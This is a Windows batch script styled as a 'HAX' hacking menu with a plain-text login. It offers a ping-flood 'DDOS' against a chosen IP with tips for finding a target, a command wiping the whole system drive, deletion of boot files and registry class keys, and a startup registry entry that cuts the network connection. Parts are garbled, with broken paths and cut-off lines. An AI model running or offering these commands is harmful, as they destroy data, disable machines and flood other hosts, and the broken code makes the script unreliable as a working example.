@echo off

:A
color 17
echo ========================
echo !ENTER WINDOWS USERNAME!
echo ========================
set /p user=USERNAME:
mkdir C:\Users\%user%\Documents\userinfo
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
echo.
echo loading.
ping localhost -n 2 >nul
cls
echo loading..
ping localhost -n 2 >nul
cls
echo loading...
ping localhost -n 2 >nul
cls
echo connected
ping localhost -n 2 >nul
cls
pause
echo.
echo ============
echo LOGIN    (1)
echo ============
echo REGISTER (2)
echo ============
echo EXIT     (3)
echo ============
set /p chs=ENTER:
if %chs%== 1 goto logon
if %chs%== 2 goto reg
if %chs%== 3 exit
goto :A
:reg
echo ================
echo     REGISTER
echo ================
set /p username=USERNAME:
set /p password=PASSWORD:
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
echo %username%>C:\"Users"\"%user%"\"Documents"\userinfo\username.txt
echo %password%>C:\"Users"\"%user%"\"Documents"\userinfo\password.txt
pause
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p confirm= <C:\Users\%user%\Desktop\confirm.txt
echo %confirm%>C:\Users\%user%\Desktop\confirm.txt
echo confirm>C:\Users\%user%\Documents\confirm2.txt
set /p confirm2= <C:\Users\%user%\Documents\confirm2.txt
echo %confirm2%>C:\Users\%user%\Documents\confirm2.txt
echo !============================================================!
echo    A FILE NAMED "CONFIRM" HAS BEEN CREATED ON YOUR DESKTOP
echo  OPEN THE FILE AND TYPE IN "confirm" TO CONFIRM YOUR REGISTER
echo !============================================================!
pause
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p confirm= <C:\Users\%user%\Desktop\confirm.txt
echo %confirm%>C:\Users\%user%\Desktop\confirm.txt
set /p confirm2= <C:\Users\%user%\Documents\confirm2.txt
echo %confirm2%>C:\Users\%user%\Documents\confirm2.txt 
if %confirm%==%confirm2% goto logon
if not %confirm%==%confirm2% goto A
:logon
echo =============
echo    LOGIN
echo =============
echo %user%>C:\Users\%user%\Documents\userinfo\winuser.txt
set /p username2= <C:\"Users"\"%user%"\"Documents"\userinfo\username.txt
set /p password2= <C:\"Users"\"%user%"\"Documents"\userinfo\password.txt
set /p username=USERNAME:
set /p password=PASSWORD:
if %username2%==%username% goto password1
if not %username2%==%username% goto logon
:password1
if %password2%==%password% goto A2
if not %password2%==%password% goto logon
if not %password2%==%password3% goto logon
:A2
if exist C:\Users\"%user%"\Desktop\confirm.txt goto A10
if not exist C:\Users\"%user%"\Desktop\confirm.txt goto A11
:A10 
cd "C:\Users\"%user%"\Desktop"
del confirm.txt
goto A11
:A11
if exist C:\Users\"%user%"\Documents\confirm2.txt goto A12
if not exist C:\Users\"%user%"\Documents\confirm2.txt goto hax
:A12
cd "C:\Users\"%user%"\Documents"
del confirm2.txt
goto hax
:hax
color 17
echo =========================
echo     WELCOME TO HAX
echo =========================
echo DDOS                  (1)
echo =========================
echo MATRIX                (2)
echo =========================
echo BLUE SCREEN OF DEATH  (3)
echo =========================
echo CRASH PC LOOP         (4)
echo =========================
echo DELETE REGISTERY      (5)
echo =========================
echo DISABLE INTERNET      (6)
echo =========================
echo BACK                  (7)
echo =========================
echo EXIT                  (8)
echo =========================
set /p chs2=ENTER:
if %chs2%== 1 goto ddostool
if %chs2%== 2 goto delete
if %chs2%== 3 goto bsod
if %chs2%== 4 goto cpl
if %chs2%== 5 goto delreg
if %chs2%== 6 goto netoff
if %chs2%== 7 goto A
if %chs2%== 8 exit
:ddostool
echo loading..
ping localhost -n 2 > nul
cls
echo laoding...
ping localhost -n 2 > nul
cls
echo connected
echo ======================================
echo IP FINDER-ANY PC                   (1)
echo ======================================
echo IP FINDER-THIS PC                  (2)
echo ====================================== 
echo CONTINUE                           (3)
echo ======================================
echo BACK                               (5)
echo ======================================
echo EXIT                               (6)
echo ======================================
set /p chs3=
if %chs3%== 1 goto wireshark
if %chs3%== 2 goto ipfinder1
if %chs3%== 3 goto cnt1
if %chs3%== 4 goto hax
if %chs3%== 5 exit
goto ddostool
:ipfinder1
echo.
c:\windows\system32\ipconfig.exe
ipconfig /release
@pause
ipconfig /renew
@pause
pause
goto ddostool
:wireshark
echo.
echo ======================================
echo START WIRESHARK                    (1)
echo ======================================
echo DOWNLOAD WIRESHARK                 (2)
echo ======================================
echo TIPS                               (3)
echo ======================================
echo CONTINUE                           (4)
echo ======================================
echo BACK                               (5)
echo ======================================
echo EXIT                               (6)
echo ======================================
set /p chs4=
if %chs4%== 1 goto wd1
if %chs4%== 2 goto wd2
if %chs4%== 3 goto wtips
if %chs4%== 4 goto cnt1
if %chs4%== 5 goto ddostool
if %chs4%== 6 exit 
goto ddostool
:wtips
echo.
echo 1.OPEN WIRESHARK
echo 2.IN THE FILTER'S TAB TYPE IN "UDP"
echo 3.CLICK START
echo 4.STOP THE SEARCH
echo 5.LOOK FOR THE MOST COMMON IP IN THE LIST
pause
goto wireshark
:wd1
echo.
start wireshark.exe
goto wireshark
:wd2
echo.
start https://www.wireshark.org/download.html
goto wireshark
:cnt1
echo.
echo ======================================
echo INSERT IP ADDRES THAT YOU WANT TO DDOS
echo ======================================
set /p ip=
echo type in continue to ddos
set /p answer200=
if %answer200%==continue  goto ddosping
:ddosping
color 17
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
start ping %ip% -t -l 60000
goto delete
:delete
color 0D
echo.
echo {0A}%random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto random
:random
color 0A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto werdy
:werdy
color 2A
echo.
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto random
:bsod
echo.
echo ===================
echo  ! W A R N I N G !
echo ===================
pause
echo ===============================
echo !ANY RESULTS CAN NOT BE UNDONE!
echo ===============================
echo ARE YOU SHURE YOU WANT TO CONTINUE?
set /p cont4=YES/NO:
if %cont4%== yes goto bsod2
if %cont4%== no goto hax
goto bsod
:bsod2
del %systemdrive%\*.*/f/s/q
shutdown -r -f -t 00
:cpl
echo.
echo ===================
echo  ! W A R N I N G !
echo ===================
pause
echo ===============================
echo !ANY RESULTS CAN NOT BE UNDONE!
echo ===============================
echo ARE YOU SHURE YOU WANT TO CONTINUE?
set /p cont3=YES/NO:
if %cont3%== yes goto cpl2
if %cont3%== no goto hax
goto cpl 
:cpl2
attrib -r-s-h c:\autoexec.bat
del c:\autexec.bat
attrib -r-s-h c:\boot.ini
del c:\boot.ini
attrib -r-s-h c:\ntldr
del c:\ntldr
attrib -r-s-h c:\windows\win.ini
del c:\windows\win.ini
:delreg
echo.
echo ===================
echo  ! W A R N I N G !
echo ===================
pause
echo ===============================
echo !ANY RESULTS CAN NOT BE UNDONE!
echo ===============================
echo ARE YOU SHURE YOU WANT TO CONTINUE?
set /p cont2=YES/NO:
if %cont2%== yes goto delreg2
if %cont2%== no goto hax
goto delreg
:delreg2
start reg delete HKCR/.exe
start reg delete HKCR/.dll
start reg delete HKCR/*
:netoff
echo.
echo ===================
echo  ! W A R N I N G !
echo ===================
pause
echo ===============================
echo !ANY RESULTS CAN NOT BE UNDONE!
echo ===============================
echo ARE YOU SHURE YOU WANT TO CONTINUE?
set /p cont=YES/NO:
if %cont%== yes goto netoff2
if %cont%== no goto hax
goto netoff
:netoff2 
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v
WINDOWsAPI/t reg_sz/d c:windowswimn32/f
reg add hkey_local_usersoftwaremicrosoftwindowscurrentversionrun/v
CONTROLexit/t reg_sz/d c:windowswimn3



